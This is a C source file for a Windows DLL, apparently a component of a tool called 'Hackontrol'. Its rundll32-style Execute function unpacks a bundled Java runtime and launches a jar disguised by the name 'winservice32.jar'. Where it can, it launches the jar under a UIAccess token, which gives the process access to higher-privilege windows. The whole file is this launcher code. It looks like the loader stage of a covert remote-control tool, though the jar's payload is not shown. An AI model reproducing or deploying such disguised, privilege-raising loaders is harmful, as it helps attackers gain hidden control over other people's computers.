#include <khopanwin32.h>
#include <khopanstring.h>
#include <hackontrol.h>
#include "extract.h"
#include "uiaccess.h"

#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")

#define FILE_JAVAW        L"javaw.exe"
#define FILE_WINSERVICE32 L"winservice32.jar"
#define FOLDER_JAVA       L"AdditionalData"

static void ExecuteJarFile(const LPWSTR pathFileJavaw, const LPWSTR argumentFileJavaw);

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	LPWSTR pathFolderHackontrol = HackontrolGetDirectory(TRUE);

	if(!pathFolderHackontrol) {
		KHWin32DialogErrorW(GetLastError(), L"HackontrolGetDirectory");
		return;
	}

	LPSTR pathFolderJava = KHFormatMessageA("%ws\\%ws", pathFolderHackontrol, FOLDER_JAVA);
	FREE(pathFolderHackontrol);

	if(!pathFolderJava) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		return;
	}

	if(!CreateDirectoryA(pathFolderJava, NULL)) {
		DWORD error = GetLastError();

		if(error != ERROR_ALREADY_EXISTS) {
			KHWin32DialogErrorW(error, L"KHFormatMessageW");
			FREE(pathFolderJava);
			return;
		}
	}

	BOOL result = ExtractJRE(pathFolderJava);

	if(result) {
		FREE(pathFolderJava);
		return;
	}

	LPWSTR pathFileJavaw = KHFormatMessageW(L"%ws\\bin\\" FILE_JAVAW, pathFolderJava);
	FREE(pathFolderJava);

	if(!pathFileJavaw) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		return;
	}

	ExecuteJarFile(pathFileJavaw, FILE_JAVAW L" -jar ..\\..\\" FILE_WINSERVICE32);
	FREE(pathFileJavaw);
}

static void ExecuteJarFile(const LPWSTR pathFileJavaw, const LPWSTR argumentFileJavaw) {
	STARTUPINFO startupInformation = {0};
	startupInformation.cb = sizeof(startupInformation);
	PROCESS_INFORMATION processInformation;
	HANDLE accessToken;

	if(!CreateUIAccessToken(&accessToken)) {
		accessToken = NULL;
	}

	if(accessToken) {
		if(!CreateProcessAsUserW(accessToken, pathFileJavaw, argumentFileJavaw, NULL, NULL, FALSE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, NULL, &startupInformation, &processInformation)) {
			KHWin32DialogErrorW(GetLastError(), L"CreateProcessAsUserW");
			return;
		}
	} else {
		if(!CreateProcessW(pathFileJavaw, argumentFileJavaw, NULL, NULL, TRUE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, NULL, &startupInformation, &processInformation)) {
			KHWin32DialogErrorW(GetLastError(), L"CreateProcessW");
			return;
		}
	}

	if(WaitForSingleObject(processInformation.hProcess, INFINITE) == WAIT_FAILED) {
		KHWin32DialogErrorW(GetLastError(), L"WaitForSingleObject");
	}

	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);
}
